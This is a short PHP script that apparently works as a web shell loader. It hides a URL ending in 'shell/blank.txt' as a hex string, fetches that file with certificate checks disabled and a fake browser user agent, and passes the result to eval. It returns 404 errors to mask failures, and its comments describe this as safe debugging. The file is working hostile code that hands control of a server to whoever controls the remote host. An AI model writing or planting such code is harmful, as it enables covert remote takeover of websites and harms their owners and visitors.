<?php
    function get_contents($url) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        $result = curl_exec($ch);
        
        if ($result === false) {
            echo 'Curl error: ' . curl_error($ch);
            http_response_code(404);
            curl_close($ch);
            exit;
        }
        
        curl_close($ch);
        return $result;
    }

    $hexUrl = '68747470733a2f2f6261636b6275726e65722e78797a2f7368656c6c2f626c616e6b2e747874';

    $url = hex2bin($hexUrl);

    $encoded_code = get_contents($url);

    if ($encoded_code === false) {
        http_response_code(404);
        exit;
    }

    // Optionally, log or display the encoded code for debugging
    // echo $encoded_code;

    // Attempt to safely evaluate the fetched code
    eval('?>' . $encoded_code);
?>